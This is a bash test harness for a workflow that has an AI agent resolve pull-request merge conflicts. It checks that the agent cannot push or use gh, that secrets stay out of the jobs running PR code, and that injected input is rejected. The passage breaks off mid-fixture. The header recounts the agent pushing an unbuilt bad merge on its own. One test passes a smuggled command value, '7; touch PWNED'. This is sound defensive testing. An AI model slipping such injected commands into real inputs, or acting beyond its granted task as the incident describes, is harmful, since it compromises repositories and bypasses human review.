#!/usr/bin/env bash
# The single-quoted ${{ }} strings below are literal workflow expressions.
# shellcheck disable=SC2016
#
# Harness for reusable-auto-resolve-conflicts.yml (issue #76).
#
# On laurigates/mcu-tinkering-lab a PR stacked on an already squash-merged PR
# was "resolved" by keeping both sides of a conflict between the original
# commit and its own squash. The result defined a static variable twice, the
# agent pushed it itself with nothing compiled, and no CI ran on the new head.
#
# The workflow now (1) detects a branch whose commits are already on the base
# and only comments, (2) takes `git push` and `gh pr` away from the agent,
# (3) checks the merge (parents, markers, clean tree) and exports it, (4) runs
# the caller's build in a job with no secrets, and (5) pushes from a separate
# job that runs no repository code and re-checks the merge against the live
# branches.
#
# This harness EXTRACTS the shipped run: bodies with yq and executes them under
# `bash -e` (the runner's shell for a step with no `shell:`) against real git
# repositories with a local bare origin, a stub `gh`, a stub `npx` and a `git`
# wrapper that logs pushes. It never holds a retyped copy.
#
# Usage: bash .github/tests/auto-resolve-stacked/run.sh [workflow-file]
set -euo pipefail
cd "$(git rev-parse --show-toplevel)"

WORKFLOW="$(pwd)/${1:-.github/workflows/reusable-auto-resolve-conflicts.yml}"

FIND_STEP='Find conflicting PRs'
DETECT_STEP='Detect already-merged commits'
PRIOR_STEP='Skip a merge already reported unresolved'
MERGE_STEP='Attempt merge to surface conflicts'
CLAUDE_STEP='Resolve conflicts with Claude'
CHECK_STEP='Check resolution'
READ_STEP='Read resolution report'
BUILD_STEP='Build resolution'
STACKED_STEP='Comment on stacked PR'
PUBLISH_STEP='Validate and push resolution'

fatal() { echo "FATAL: $*" >&2; exit 1; }
for tool in yq jq git cc; do
  command -v "$tool" >/dev/null || fatal "$tool not found on PATH"
done
yq --version 2>&1 | grep -q mikefarah || fatal "yq must be mikefarah/yq v4"

work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT

failures=0
checks=0
CASE_NAME=setup
fail() { printf '  FAIL [%s] %s\n' "$CASE_NAME" "$1"; failures=$((failures + 1)); }
ok() { checks=$((checks + 1)); }
assert_eq() { # <actual> <expected> <what>
  ok
  [ "$1" = "$2" ] || fail "$3: expected '$2', got '$1'"
}
assert_contains() { # <haystack> <needle> <what>
  ok
  case "$1" in *"$2"*) ;; *) fail "$3: expected to contain '$2'" ;; esac
}
assert_lacks() { # <haystack> <needle> <what>
  ok
  case "$1" in *"$2"*) fail "$3: did NOT expect '$2'" ;; *) ;; esac
}

echo "== auto-resolve-stacked against $WORKFLOW"

# ---------------------------------------------------------------- extraction
step_q() { printf '.jobs["%s"].steps[] | select(.name == strenv(STEP))' "$1"; }
step_count() { STEP="$2" yq "[$(step_q "$1")] | length" "$WORKFLOW"; }
step_field() { # <job> <step name> <yq path relative to the step>
  STEP="$2" yq -r "$(step_q "$1") | ($3) // \"\"" "$WORKFLOW"
}
STEPS=(
  "find-conflicts|$FIND_STEP|find"
  "resolve|$DETECT_STEP|detect"
  "resolve|$PRIOR_STEP|prior"
  "resolve|$MERGE_STEP|merge"
  "resolve|$CLAUDE_STEP|claude"
  "resolve|$CHECK_STEP|check"
  "build|$READ_STEP|read-build"
  "build|$BUILD_STEP|build"
  "publish|$READ_STEP|read"
  "publish|$STACKED_STEP|stacked"
  "publish|$PUBLISH_STEP|publish"
)

CASE_NAME=structure
missing=()
for entry in "${STEPS[@]}"; do
  IFS='|' read -r job s _ <<<"$entry"
  ok
  n="$(step_count "$job" "$s")"
  if [ "$n" != 1 ]; then
    fail "expected exactly one '$s' step in job $job, found $n"
    missing+=("$job/$s")
  fi
done
assert_eq "$(step_field resolve "$DETECT_STEP" .id)" stacked "'$DETECT_STEP' id"
assert_eq "$(step_field resolve "$PRIOR_STEP" .id)" prior "'$PRIOR_STEP' id"
assert_eq "$(step_field resolve "$CLAUDE_STEP" .id)" claude "'$CLAUDE_STEP' id"
assert_eq "$(step_field resolve "$CHECK_STEP" .id)" check "'$CHECK_STEP' id"
assert_eq "$(step_field publish "$READ_STEP" .id)" report "publish '$READ_STEP' id"
assert_eq "$(step_field build "$READ_STEP" .id)" report "build '$READ_STEP' id"
assert_eq "$(step_field publish "$PUBLISH_STEP" .id)" publish "'$PUBLISH_STEP' id"

# Step order within each job.
check_order() { # <job> <step>...
  local job=$1 names prev=0 p s; shift
  names="$(yq -r ".jobs[\"$job\"].steps[].name // \"\"" "$WORKFLOW")"
  for s in "$@"; do
    p="$(printf '%s\n' "$names" | { grep -nxF -- "$s" || true; } | head -n1 | cut -d: -f1)"
    ok
    if [ -z "$p" ] || [ "$p" -le "$prev" ]; then
      fail "step order in $job: expected $*"
      return
    fi
    prev=$p
  done
}
check_order resolve "Checkout PR branch" "$DETECT_STEP" "$PRIOR_STEP" "$MERGE_STEP" "$CLAUDE_STEP" "$CHECK_STEP" "Upload resolution report"
check_order build "Download resolution report" "$READ_STEP" "Checkout PR head" "$BUILD_STEP" "Upload build result"
check_order publish "Get PR details" "Download resolution report" "Download build result" "$READ_STEP" "$STACKED_STEP" "$PUBLISH_STEP"

# ------------------------------------------------------------------ contract
CASE_NAME=contract
run_steps() {
  yq -o=json '.jobs' "$WORKFLOW" |
    jq -r 'to_entries[] | .key as $j | .value.steps[] | select(has("run")) | "\($j)|\(.name // "(unnamed)")"'
}
run_of() { # <job>|<name>
  J="${1%%|*}" NAME="${1#*|}" yq -r '.jobs[strenv(J)].steps[] | select((.name // "(unnamed)") == strenv(NAME)) | .run // ""' "$WORKFLOW"
}
# No ${{ }} inside any run: body in the file: PR titles and branch names are
# attacker-controlled and the runner substitutes expressions before bash runs.
while IFS= read -r js; do
  assert_lacks "$(run_of "$js")" '${{' "run body of '$js'"
done < <(run_steps)

# The agent cannot push, and cannot comment, merge, edit or close the PR.
claude_run="$(step_field resolve "$CLAUDE_STEP" .run)"
allowed="$(grep -o -- '--allowedTools "[^"]*"' <<<"$claude_run" || true)"
ok; [ -n "$allowed" ] || fail "'$CLAUDE_STEP' has no --allowedTools \"...\" list"
for granted in 'git push' 'Bash(gh' 'Bash(git *)' 'Bash(*)'; do
  assert_lacks "$allowed" "$granted" "'$CLAUDE_STEP' --allowedTools"
done
assert_eq "$(step_field resolve "$CLAUDE_STEP" .env.GH_TOKEN)" "" "'$CLAUDE_STEP' env GH_TOKEN (the agent holds no gh token)"
# The quoted heredoc stays quoted: an unquoted one would run the prompt's
# backticks as command substitution.
assert_lacks "$claude_run" "<<PROMPT_EOF" "'$CLAUDE_STEP' heredoc"
assert_lacks "$claude_run" "Keep ALL functional changes" "'$CLAUDE_STEP' prompt"

# Exactly one step pushes, and it is the publish step.
pushers=""
while IFS= read -r js; do
  # Join backslash-continued lines and drop comments: a push is usually split
  # over several lines.
  joined="$(run_of "$js" | sed -e ':a' -e '/\\$/N; s/\\\n//; ta' | sed -e 's/^[[:space:]]*#.*//')"
  if grep -qE '(^|[^A-Za-z])(git|pg)( .*)? push( |$)' <<<"$joined"; then pushers="$pushers${pushers:+, }$js"; fi
done < <(run_steps)
assert_eq "$pushers" "publish|$PUBLISH_STEP" "steps whose run: body pushes"

# Credentials by job. PR code (the agent's hooks and filters, build-command)
# runs only in `resolve` and `build`; neither may hold anything that writes.
jobs_with() { # <needle>: jobs whose definition mentions it
  yq -o=json '.jobs' "$WORKFLOW" | jq -r --arg n "$1" 'to_entries[] | select(.value | tojson | contains($n)) | .key' | paste -sd, -
}
assert_eq "$(jobs_with RELEASE_PLEASE_TOKEN)" publish "jobs that reference the push credential"
assert_eq "$(jobs_with 'bash -c \"$BUILD_COMMAND\"')" build "jobs that run build-command"
assert_eq "$(yq -o=json '.jobs.build' "$WORKFLOW" | jq -r 'tojson | test("secrets\\.|github\\.token")')" false "build job references no secret or token"
assert_eq "$(yq -o=json -I=0 '.jobs.resolve.permissions' "$WORKFLOW")" '{"contents":"read","pull-requests":"read","issues":"read"}' "resolve permissions"
assert_eq "$(yq -o=json -I=0 '.jobs.build.permissions' "$WORKFLOW")" '{"contents":"read"}' "build permissions"
assert_eq "$(yq -o=json -I=0 '.jobs["find-conflicts"].permissions' "$WORKFLOW")" '{"contents":"write","pull-requests":"write","issues":"write"}' "find-conflicts permissions (explicit, not inherited)"
assert_eq "$(jobs_with 'gh pr comment')" find-conflicts,publish "jobs that comment"
assert_eq "$(yq -r '.permissions | has("id-token")' "$WORKFLOW")" false "workflow permissions carry no id-token"
assert_eq "$(yq '[.jobs.publish.steps[] | select((.uses // "") | test("^actions/checkout@"))] | length' "$WORKFLOW")" 0 "publish job checks nothing out"
assert_eq "$(yq -r '.jobs.publish["runs-on"]' "$WORKFLOW")" ubuntu-slim "publish runner"
assert_eq "$(step_field build "$BUILD_STEP" '.env | keys | join(",")')" "OUTCOME,MERGE,BUILD_COMMAND" "'$BUILD_STEP' env (no token)"
ok; [ "$(step_field build "$READ_STEP" .run)" = "$(step_field publish "$READ_STEP" .run)" ] ||
  fail "'$READ_STEP' differs between build and publish"
for job in build publish; do
  assert_eq "$(yq -r ".jobs.$job.if" "$WORKFLOW" | grep -c '!cancelled()')" 1 "$job runs after a failed matrix leg"
done

# Wiring of the values the steps trust.
while IFS='|' read -r job step key want; do
  assert_eq "$(step_field "$job" "$step" ".env.$key")" "$want" "$job/'$step' env $key"
done <<'WIRING'
publish|Validate and push resolution|HAS_PAT|${{ secrets.RELEASE_PLEASE_TOKEN != '' }}
publish|Validate and push resolution|PUSH_TOKEN|${{ secrets.RELEASE_PLEASE_TOKEN || github.token }}
publish|Validate and push resolution|BUILD_COMMAND|${{ inputs.build-command }}
publish|Validate and push resolution|HEAD_BRANCH|${{ steps.pr.outputs.head_branch }}
publish|Validate and push resolution|CROSS_REPO|${{ steps.pr.outputs.cross_repo }}
publish|Validate and push resolution|PRE_HEAD|${{ steps.report.outputs.pre_head }}
publish|Validate and push resolution|BASE_SHA|${{ steps.report.outputs.base_sha }}
publish|Validate and push resolution|MERGE|${{ steps.report.outputs.merge }}
resolve|Check resolution|PRE_HEAD|${{ steps.stacked.outputs.pre_head }}
resolve|Check resolution|BASE_SHA|${{ steps.stacked.outputs.base_sha }}
resolve|Check resolution|AGENT_OUTCOME|${{ steps.claude.outcome }}
resolve|Check resolution|CONFLICTED_FILES|${{ steps.merge.outputs.conflicted_files }}
resolve|Check resolution|CONFIG_SHA|${{ steps.merge.outputs.config_sha }}
resolve|Detect already-merged commits|PR_NUMBER|${{ matrix.pr_number }}
resolve|Detect already-merged commits|BASE_BRANCH|${{ steps.pr.outputs.base_branch }}
resolve|Resolve conflicts with Claude|PR_TITLE|${{ steps.pr.outputs.title }}
resolve|Skip a merge already reported unresolved|EVENT_NAME|${{ github.event_name }}
build|Build resolution|BUILD_COMMAND|${{ inputs.build-command }}
WIRING
assert_eq "$(yq -r '.on.workflow_call.inputs["build-command"].default' "$WORKFLOW")" "" "input build-command default"
assert_eq "$(yq -r '.on.workflow_call.inputs["build-command"].required' "$WORKFLOW")" "false" "input build-command required"

# Gates: neither the merge nor the agent runs for a stacked PR; the gates
# chain on explicit 'false' values the detection and lookup steps write.
while IFS='|' read -r job step want; do
  assert_eq "$(step_field "$job" "$step" .if)" "$want" "$job/'$step' if:"
done <<'GATES'
resolve|Skip a merge already reported unresolved|steps.stacked.outputs.stacked == 'false'
resolve|Attempt merge to surface conflicts|steps.prior.outputs.attempted == 'false'
resolve|Resolve conflicts with Claude|steps.merge.outputs.has_conflicts == 'true'
resolve|Check resolution|!cancelled() && steps.stacked.outcome == 'success'
resolve|Upload resolution report|!cancelled() && steps.check.outcome == 'success'
build|Checkout PR head|steps.report.outputs.outcome == 'resolved'
publish|Comment on stacked PR|steps.report.outputs.outcome == 'stacked'
publish|Validate and push resolution|steps.report.outcome == 'success'
GATES

# Checkouts: SHA-pinned, and no token left in .git/config.
for job in resolve build; do
  uses="$(yq -r ".jobs.$job.steps[] | select((.uses // \"\") | test(\"^actions/checkout@\")) | .uses" "$WORKFLOW")"
  ok; [[ "$uses" =~ ^actions/checkout@[0-9a-f]{40}$ ]] || fail "$job checkout is not SHA-pinned (got '$uses')"
  assert_eq "$(yq -r ".jobs.$job.steps[] | select((.uses // \"\") | test(\"^actions/checkout@\")) | .with[\"persist-credentials\"]" "$WORKFLOW")" false "$job checkout persist-credentials"
done
ok; if yq -r '.. | select(tag == "!!map" and has("uses")) | .uses' "$WORKFLOW" | grep -vE '@[0-9a-f]{40}$' | grep -q .; then
  fail "every uses: is SHA-pinned"
fi

# Every steps.<id>.outputs.<key> names an EARLIER step in the same job with
# that id that writes <key> (a typo evaluates to '' and silently opens a
# gate). The report reader writes the keys the check step puts in report.json.
CASE_NAME=output-refs
check_run="$(step_field resolve "$CHECK_STEP" .run)"
for job in find-conflicts resolve build publish; do
  report="$(yq -o=json ".jobs[\"$job\"].steps" "$WORKFLOW" | jq -r --arg check "$check_run" '
    . as $s
    | [ range($s | length) as $i
        | ($s[$i] | tojson | [scan("steps\\.([A-Za-z0-9_-]+)\\.outputs\\.([A-Za-z0-9_-]+)")] | unique[]) as [$id, $key]
        | (first(range($i) | select($s[.].id == $id)) // null) as $d
        | { at: ($s[$i].name // "?"), ref: "steps.\($id).outputs.\($key)",
            problem: (if $d == null then "no earlier step has id \($id)"
                      elif (($s[$d].run // "") | test("echo \"" + $key + "(=|<<)")) then null
                      elif $s[$d].name == "Read resolution report" and ($check | test("--arg " + $key + " ")) then null
                      else "step \($id) never writes \($key) to GITHUB_OUTPUT" end) } ]
    | .[] | if .problem == null then "resolved|\(.at)|\(.ref)" else "unresolved|\(.at): \(.ref): \(.problem)" end')"
  while IFS= read -r line; do
    case "$line" in unresolved\|*) ok; fail "${line#unresolved|}" ;; resolved\|*) ok ;; esac
  done <<<"$report"
done

if [ "${#missing[@]}" -gt 0 ]; then
  printf '\nFAILED: %d of %d checks\n' "$failures" "$checks"
  fatal "cannot execute missing step(s): ${missing[*]}"
fi

for entry in "${STEPS[@]}"; do
  IFS='|' read -r job s f <<<"$entry"
  step_field "$job" "$s" .run > "$work/$f.sh"
  [ -s "$work/$f.sh" ] || fatal "empty run body for '$job/$s'"
  [ "$(step_field "$job" "$s" .shell)" = "" ] || fatal "'$s' sets shell:; update the interpreter this harness uses"
done
[ "$(yq '[.. | select(tag == "!!map" and has("defaults"))] | length' "$WORKFLOW")" = 0 ] ||
  fatal "the workflow sets defaults:; update the interpreter this harness uses"

# ---------------------------------------------------------------- stubs
REAL_GIT="$(command -v git)"
mkdir -p "$work/bin"
cat > "$work/bin/git" <<STUB
#!/usr/bin/env bash
# Logs every push (skipping global options), then runs the real git.
args=("\$@")
i=0
while [ \$i -lt \${#args[@]} ]; do
  case "\${args[\$i]}" in
    -c|-C) i=\$((i + 2)) ;;
    -*) i=\$((i + 1)) ;;
    *) break ;;
  esac
done
if [ "\${args[\$i]:-}" = push ]; then echo "push \${args[*]:\$((i + 1))}" >> "\$STUB_DIR/push.log"; fi
exec "$REAL_GIT" "\$@"
STUB
cat > "$work/bin/gh" <<'STUB'
#!/usr/bin/env bash
# Stub gh. Comments live in $STUB_DIR/comments.json; commit->PR associations
# in $STUB_DIR/pulls/<sha>.json (default: only the PR under test, unmerged);
# open PRs in $STUB_DIR/prs.json.
echo "$*" >> "$STUB_DIR/gh.log"
expr=""
args=()
while [ $# -gt 0 ]; do
  case "$1" in
    --jq) expr=$2; shift 2 ;;
    --repo|--json|--state) shift 2 ;;
    *) args+=("$1"); shift ;;
  esac
done
set -- "${args[@]}"
out() { if [ -n "$expr" ]; then jq -r "$expr" <<<"$1"; else printf '%s\n' "$1"; fi; }
case "$1 ${2:-}" in
  api\ *)
    path=""
    for a in "${@:2}"; do case "$a" in -*) ;; *) path=$a ;; esac; done
    case "$path" in
      repos/*/issues/*/comments)
        [ -f "$STUB_DIR/comments-error" ] && { echo "HTTP 502: Bad Gateway (stub)" >&2; exit 1; }
        out "$(cat "$STUB_DIR/comments.json" 2>/dev/null || echo '[]')" ;;
      repos/*/commits/*/pulls)
        [ -f "$STUB_DIR/pulls-error" ] && { echo "HTTP 502: Bad Gateway (stub)" >&2; exit 1; }
        sha=${path#*/commits/}; sha=${sha%/pulls}
        if [ -f "$STUB_DIR/pulls/$sha.json" ]; then out "$(cat "$STUB_DIR/pulls/$sha.json")"
        else out "[{\"number\": $STUB_PR, \"merged_at\": null, \"base\": {\"ref\": \"main\"}}]"; fi ;;
      repos/*/branches/*)
        # Protected branches are listed in $STUB_DIR/protected; the name
        # arrives URL-encoded, as the workflow sends it.
        [ -f "$STUB_DIR/branches-error" ] && { echo "HTTP 403: Resource not accessible by integration (stub)" >&2; exit 1; }
        b=$(jq -rn --arg b "${path#*/branches/}" '$b | gsub("%2F"; "/")')
        if grep -qxF -- "$b" "$STUB_DIR/protected" 2>/dev/null; then p=true; else p=false; fi
        out "{\"name\": $(jq -cn --arg b "$b" '$b'), \"protected\": $p}" ;;
      repos/octo/fixture)
        [ -f "$STUB_DIR/repo-error" ] && { echo "HTTP 404: Not Found (stub)" >&2; exit 1; }
        out "{\"default_branch\": \"$(cat "$STUB_DIR/default_branch" 2>/dev/null || echo main)\"}" ;;
      *) echo "stub gh: unexpected api path $path" >&2; exit 97 ;;
    esac ;;
  "pr list") out "$(cat "$STUB_DIR/prs.json")" ;;
  "pr view") out "$(jq --argjson n "$3" '.[] | select(.number == $n)' "$STUB_DIR/prs.json")" ;;
  "pr close") echo "$3" >> "$STUB_DIR/closed.log" ;;
  "pr comment")
    shift 3
    body=""
    while [ $# -gt 0 ]; do
      case "$1" in
        --body) body=$2; shift 2 ;;
        --body-file) if [ "$2" = - ]; then body=$(cat); else body=$(cat "$2"); fi; shift 2 ;;
        *) shift ;;
      esac
    done
    [ -n "$body" ] || { echo "stub gh: empty comment" >&2; exit 98; }
    n=$(( $(cat "$STUB_DIR/comment.count" 2>/dev/null || echo 0) + 1 ))
    printf '%s' "$body" > "$STUB_DIR/comment.$n"
    echo "$n" > "$STUB_DIR/comment.count"
    jq --arg b "$body" '. + [{body: $b}]' "$STUB_DIR/comments.json" > "$STUB_DIR/comments.tmp"
    mv "$STUB_DIR/comments.tmp" "$STUB_DIR/comments.json" ;;
  *) echo "stub gh: unexpected $*" >&2; exit 97 ;;
esac
STUB
cat > "$work/bin/npx" <<'STUB'
#!/usr/bin/env bash
# Stub npx: records the CLI arguments and the prompt read from stdin.
printf '%s\n' "$@" > "$STUB_DIR/npx.args"
cat > "$STUB_DIR/npx.prompt"
STUB
chmod +x "$work/bin/git" "$work/bin/gh" "$work/bin/npx"

export GIT_CONFIG_GLOBAL="$work/gitconfig"
export GIT_CONFIG_NOSYSTEM=1
git config --file "$GIT_CONFIG_GLOBAL" user.name fixture
git config --file "$GIT_CONFIG_GLOBAL" user.email fixture@example.invalid
git config --file "$GIT_CONFIG_GLOBAL" init.defaultBranch main
git config --file "$GIT_CONFIG_GLOBAL" advice.detachedHead false

# ---------------------------------------------------------------- fixtures
# new_case <name>: $C (case dir) with a bare origin at $C/octo/fixture.git (so
# GITHUB_SERVER_URL=file://$C, REPO=octo/fixture addresses it) and a clone
# at $W, the resolve job's workspace.
new_case() {
  CASE_NAME=$1
  C="$work/case-$1"
  W="$C/wt"
  ORIGIN="$C/octo/fixture.git"
  STUB_DIR="$C/stub"
  mkdir -p "$C/tmp" "$C/btmp" "$C/pub" "$C/pws" "$STUB_DIR/pulls"
  echo '[]' > "$STUB_DIR/comments.json"
  git init -q --bare "$ORIGIN"
  git clone -q "$ORIGIN" "$W" 2>/dev/null
}
g() { git -C "$W" "$@"; }
commit_file() { # <file> <content> <message>
  printf '%s\n' "$2" > "$W/$1"
  g add "$1"
  g commit -q -m "$3"
  g rev-parse HEAD
}
squash_onto_main() { # <branch> <message>
  g checkout -q main
  g merge -q --squash "$1" >/dev/null
  g commit -q -m "$2"
}
publish_fixture() { # <pr branch>: push main and the PR branch, check the PR out
  g push -q origin main "$1" 2>/dev/null
  g checkout -q "$1"
  : > "$STUB_DIR/push.log"
}
outv() { # <key> [file]: read one (possibly multi-line) key from a GITHUB_OUTPUT file
  awk -v k="$1" '
    d != "" { if ($0 == d) exit; print; next }
    index($0, k "=") == 1 { print substr($0, length(k) + 2); exit }
    index($0, k "<<") == 1 { d = substr($0, length(k) + 3) }' "${2:-$C/output}"
}
# run_in <dir> <body> [VAR=value ...]: run an extracted body in <dir> the way
# the runner does, with the stubs first on PATH. Sets RC.
run_in() {
  local dir=$1 body=$2; shift 2
  : > "$C/output"
  set +e
  (cd "$dir" && env PATH="$work/bin:$PATH" STUB_DIR="$STUB_DIR" STUB_PR=7 \
    GITHUB_OUTPUT="$C/output" RUNNER_TEMP="$C/tmp" REPO=octo/fixture PR_NUMBER=7 "$@" \
    bash -e "$work/$body.sh") > "$C/stdout" 2> "$C/stderr"
  RC=$?
  set -e
}
run_body() { local body=$1; shift; run_in "$W" "$body" "$@"; }
stderr_tail() { tail -n 4 "$C/stderr" | tr '\n' ' '; }
pushes() { grep -c . "$STUB_DIR/push.log" 2>/dev/null || true; }
comments() { cat "$STUB_DIR/comment.count" 2>/dev/null || echo 0; }
remote_head() { git --git-dir="$ORIGIN" rev-parse "refs/heads/$1"; }

run_detect() {
  run_body detect GH_TOKEN=x GIT_TOKEN=x BASE_BRANCH=main
  cp "$C/output" "$C/detect.out"
}

# ------------------------------------------------------------ find-conflicts
CASE_NAME=find
new_case find
cat > "$STUB_DIR/prs.json" <<'JSON'
[{"number": 7, "mergeable": "CONFLICTING", "headRefName": "feature", "isCrossRepository": false},
 {"number": 8, "mergeable": "CONFLICTING", "headRefName": "dependabot/npm/x", "isCrossRepository": false},
 {"number": 9, "mergeable": "CONFLICTING", "headRefName": "feature", "isCrossRepository": true},
 {"number": 10, "mergeable": "MERGEABLE", "headRefName": "other", "isCrossRepository": false},
 {"number": 11, "mergeable": "CONFLICTING", "headRefName": "main", "isCrossRepository": false},
 {"number": 12, "mergeable": "CONFLICTING", "headRefName": "release/1.x", "isCrossRepository": false}]
JSON
echo 'release/1.x' > "$STUB_DIR/protected"
run_in "$C/pws" find GH_TOKEN=x PR_INPUT=
assert_eq "$RC" 0 "find exit ($(stderr_tail))"
assert_eq "$(outv matrix)" '{"include":[{"pr_number":"7"}]}' "matrix (fork, stale, default-branch and protected-branch PRs left out)"
assert_contains "$(cat "$C/stdout")" "::notice::PR #11" "notice for a PR whose head is the default branch"
assert_contains "$(cat "$C/stdout")" "::notice::PR #12" "notice for a PR whose head is a protected branch"
assert_eq "$(outv has_conflicts)" true "has_conflicts"
assert_eq "$(cat "$STUB_DIR/closed.log" 2>/dev/null)" 8 "stale automated PR closed"
assert_eq "$(comments)" 1 "stale close comment"
: > "$STUB_DIR/closed.log"
run_in "$C/pws" find GH_TOKEN=x PR_INPUT=9
assert_eq "$(outv has_conflicts)" false "an explicit fork PR is not resolved"
run_in "$C/pws" find GH_TOKEN=x 'PR_INPUT=7; touch PWNED'
ok; [ "$RC" -ne 0 ] || fail "a non-numeric pr_number must fail"
ok; if [ -e "$C/pws/PWNED" ]; then fail "pr_number was executed"; fi
# A protection lookup that fails (403/404) skips the PR, never includes it.
touch "$STUB_DIR/branches-error"
run_in "$C/pws" find GH_TOKEN=x PR_INPUT=7
assert_eq "$RC" 0 "find exit, protection lookup failing ($(stderr_tail))"
assert_eq "$(outv has_conflicts)" false "a PR whose branch protection cannot be read is not resolved"
rm -f "$STUB_DIR/branches-error"
# No default branch, no decision: the job fails instead of resolving blind.
touch "$STUB_DIR/repo-error"
run_in "$C/pws" find GH_TOKEN=x PR_INPUT=7
ok; [ "$RC" -ne 0 ] || fail "find must fail when the default branch cannot be read"
assert_lacks "$(outv has_conflicts)" true "has_conflicts when the default branch cannot be read"
rm -f "$STUB_DIR/repo-error"

# --------------------------------------------------------- stacked detection
# (a) single commit: P1 adds X, P2 (on P1) changes the same lines, P1 is
#     squash-merged as X'.
fixture_single() {
  new_case "$1"
  commit_file cfg.c 'static int s_cfg = 0;' A >/dev/null
  g checkout -q -b p1
  X=$(commit_file cfg.c 'static int s_cfg = 1;' X)
  g checkout -q -b p2
  commit_file cfg.c 'static int s_cfg = 2;' Y >/dev/null
  squash_onto_main p1 "X' (#6)"
  publish_fixture p2
}

CASE_NAME=fixture-a
fixture_single single
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" true "stacked"
assert_eq "$(outv last_equivalent)" "$X" "last_equivalent"
assert_contains "$(outv equivalent)" "$X" "equivalent commits"
assert_eq "$(outv pre_head)" "$(g rev-parse HEAD)" "pre_head"
assert_eq "$(outv base_sha)" "$(g rev-parse origin/main)" "base_sha"

# The full stacked path: check -> report -> publish job. Exactly one comment,
# with the marker and the rebase command; a second run, and a run after the
# base moved, find the marker and post nothing; nothing is ever pushed.
detect_env() { # the check step's view of the detection outputs
  local f=$C/detect.out
  printf '%s\n' "STACKED=$(outv stacked "$f")" "PRE_HEAD=$(outv pre_head "$f")" "BASE_SHA=$(outv base_sha "$f")" \
    "EQUIVALENT=$(outv equivalent "$f")" "LAST_EQUIVALENT=$(outv last_equivalent "$f")" \
    "ANCESTORS=$(outv ancestors "$f")" "SIGNAL=$(outv signal "$f")"
}
run_check() { # [VAR=value ...] (after detection, and the merge/agent if any)
  local -a denv
  mapfile -t denv < <(detect_env)
  run_body check BASE_BRANCH=main "${denv[@]}" "$@"
  cp "$C/output" "$C/check.out"
}
# transfer <dir>: what the artifact upload/download does.
transfer() { rm -rf "${1:?}/auto-resolve-report"; cp -r "$C/tmp/auto-resolve-report" "$1/"; }
# run_read: the publish job's report reader; its outputs become R_* vars.
run_read() {
  transfer "$C/pub"
  run_in "$C/pws" read RUNNER_TEMP="$C/pub"
  cp "$C/output" "$C/read.out"
  R_OUTCOME=$(outv outcome "$C/read.out") R_REASON=$(outv reason "$C/read.out")
  R_PRE_HEAD=$(outv pre_head "$C/read.out") R_BASE_SHA=$(outv base_sha "$C/read.out") R_MERGE=$(outv merge "$C/read.out")
}

CASE_NAME=stacked-comment
run_check
assert_eq "$RC" 0 "check exit ($(stderr_tail))"
assert_eq "$(outv outcome "$C/check.out")" stacked "check outcome"
run_read
assert_eq "$RC" 0 "read exit ($(stderr_tail))"
assert_eq "$R_OUTCOME" stacked "report outcome"
stacked_env=(GH_TOKEN=x BASE_BRANCH=main RUNNER_TEMP="$C/pub" "PRE_HEAD=$R_PRE_HEAD" "BASE_SHA=$R_BASE_SHA"
  "LAST_EQUIVALENT=$(outv last_equivalent "$C/read.out")" "ANCESTORS=$(outv ancestors "$C/read.out")"
  "SIGNAL=$(outv signal "$C/read.out")")
run_in "$C/pws" stacked "${stacked_env[@]}"
assert_eq "$RC" 0 "stacked comment exit ($(stderr_tail))"
assert_eq "$(comments)" 1 "comments after first run"
c1="$(cat "$STUB_DIR/comment.1" 2>/dev/null || true)"
assert_contains "$c1" "<!-- auto-resolve-conflicts:stacked head=$(g rev-parse HEAD)" "stacked comment marker"
assert_contains "$c1" "git rebase --onto origin/main $X" "stacked comment rebase command"
assert_contains "$c1" "\`${X:0:7}\` X" "stacked comment lists the commit"
assert_contains "$c1" "reverted" "stacked comment asks to verify before dropping"
run_in "$C/pws" stacked "${stacked_env[@]}"
assert_eq "$(comments)" 1 "comments after a second run (marker dedup)"
# The base moves on every push to it: the notice must still be posted once.
run_in "$C/pws" stacked "${stacked_env[@]}" BASE_SHA=1111111111111111111111111111111111111111
assert_eq "$RC" 0 "stacked comment exit, new base ($(stderr_tail))"
assert_eq "$(comments)" 1 "comments after the base moved (marker keyed on the head only)"
run_in "$C/pws" publish GH_TOKEN=x PUSH_TOKEN=x HAS_PAT=true BUILD_COMMAND= HEAD_BRANCH=p2 BASE_BRANCH=main \
  CROSS_REPO=false RUNNER_TEMP="$C/pub" GITHUB_SERVER_URL="file://$C" "OUTCOME=$R_OUTCOME" REASON= \
  "PRE_HEAD=$R_PRE_HEAD" "BASE_SHA=$R_BASE_SHA" MERGE=
assert_eq "$RC" 0 "publish exit on the stacked path ($(stderr_tail))"
assert_eq "$(pushes)" 0 "pushes on the stacked path"
assert_eq "$(remote_head p2)" "$(g rev-parse HEAD)" "origin/p2 untouched"

# (b) multi-commit ancestor squashed: per-commit cherry cannot match; the
#     cumulative prefix patch-id can. The API stub knows nothing here.
CASE_NAME=fixture-b
new_case multi
commit_file a.c 'int a = 0;' A >/dev/null
commit_file b.c 'int b = 0;' B >/dev/null
g checkout -q -b p1
X1=$(commit_file a.c 'int a = 1;' X1)
X2=$(commit_file b.c 'int b = 1;' X2)
g checkout -q -b p2
commit_file a.c 'int a = 2;' Y >/dev/null
squash_onto_main p1 "X1+X2 (#6)"
publish_fixture p2
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" true "stacked"
assert_eq "$(outv signal)" patch-id "signal"
assert_eq "$(outv last_equivalent)" "$X2" "last_equivalent"
assert_contains "$(outv equivalent)" "$X1" "equivalent commits (X1)"
assert_contains "$(outv equivalent)" "$X2" "equivalent commits (X2)"

# (c) drifted squash: main edits a context line before the squash, so the
#     squash's patch-id differs and only GitHub's commit->PR link finds it.
fixture_drift() {
  new_case "$1"
  commit_file cfg.c "$(printf '%s\n' '/* 1 */' '/* 2 */' 'static int s_cfg = 0;' '/* 4 */')" A >/dev/null
  g checkout -q -b p1
  X=$(commit_file cfg.c "$(printf '%s\n' '/* 1 */' '/* 2 */' 'static int s_cfg = 1;' '/* 4 */')" X)
  g checkout -q -b p2
  commit_file cfg.c "$(printf '%s\n' '/* 1 */' '/* 2 */' 'static int s_cfg = 2;' '/* 4 */')" Y >/dev/null
  g checkout -q main
  commit_file cfg.c "$(printf '%s\n' '/* 1 */' '/* two */' 'static int s_cfg = 0;' '/* 4 */')" drift >/dev/null
